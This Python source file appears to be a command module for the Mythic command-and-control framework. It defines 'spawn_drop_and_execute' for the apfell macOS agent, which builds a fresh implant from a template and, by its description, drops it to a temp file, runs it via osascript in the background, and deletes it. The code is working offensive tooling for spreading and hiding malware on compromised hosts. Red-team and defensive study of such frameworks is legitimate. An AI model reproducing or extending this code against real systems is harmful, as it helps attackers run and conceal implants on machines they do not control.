from mythic_container.MythicCommandBase import *
import sys
from mythic_container.MythicRPC import *
import asyncio


class SpawnDropAndExecuteArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="template",
                type=ParameterType.Payload,
                description="apfell agent to use as template to generate a new payload",
                supported_agents=["apfell"],
            )
        ]

    async def parse_arguments(self):
        if len(self.command_line) == 0:
            raise ValueError("Must supply arguments")
        raise ValueError("Must use the modal")

    async def parse_dictionary(self, dictionary_arguments):
        self.load_args_from_dictionary(dictionary_arguments)


class SpawnDropAndExecuteCommand(CommandBase):
    cmd = "spawn_drop_and_execute"
    needs_admin = False
    help_cmd = "spawn_drop_and_execute"
    description = "Generate a new payload, drop it to a temp location, execute it with osascript as a background process, and then delete the file. Automatically reports back the temp file it created"
    version = 1
    author = "@its_a_feature_"
    attackmapping = ["T1059.002", "T1553.001"]
    argument_class = SpawnDropAndExecuteArguments

    async def create_go_tasking(self, taskData: MythicCommandBase.PTTaskMessageAllData) -> MythicCommandBase.PTTaskCreateTaskingMessageResponse:
        response = MythicCommandBase.PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )
        try:
            gen_resp = await SendMythicRPCPayloadCreateFromUUID(MythicRPCPayloadCreateFromUUIDMessage(
                TaskID=taskData.Task.ID,
                PayloadUUID=taskData.args.get_arg("template"),
                NewDescription=f"Autogenerated from task {taskData.Task.ID}",
                NewFilename=f"apfell-{taskData.Task.ID}"
            ))
            if gen_resp.Success:
                # we know a payload is building, now we want it
                while True:
                    resp = await SendMythicRPCPayloadSearch(MythicRPCPayloadSearchMessage(
                        PayloadUUID=gen_resp.NewPayloadUUID
                    ))
                    if resp.Success:
                        if resp.Payloads[0].BuildPhase == "success":
                            taskData.args.add_arg("template", resp.Payloads[0].AgentFileId)
                            taskData.display_params = f"new Apfell payload ({resp.Payloads[0].UUID}) with description {resp.Payloads[0].Description}"
                            break
                        elif resp.Payloads[0].BuildPhase == "error":
                            raise Exception(
                                "Failed to build new payload"
                            )
                        else:
                            await asyncio.sleep(1)
                    else:
                        raise Exception("Failed to get information about new payload:\n" + resp.Error)
            else:
                raise Exception("Failed to generate new payload:\n" + gen_resp.Error)
        except Exception as e:
            raise Exception("Error trying to call RPC:\n" + str(e))
        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        return resp
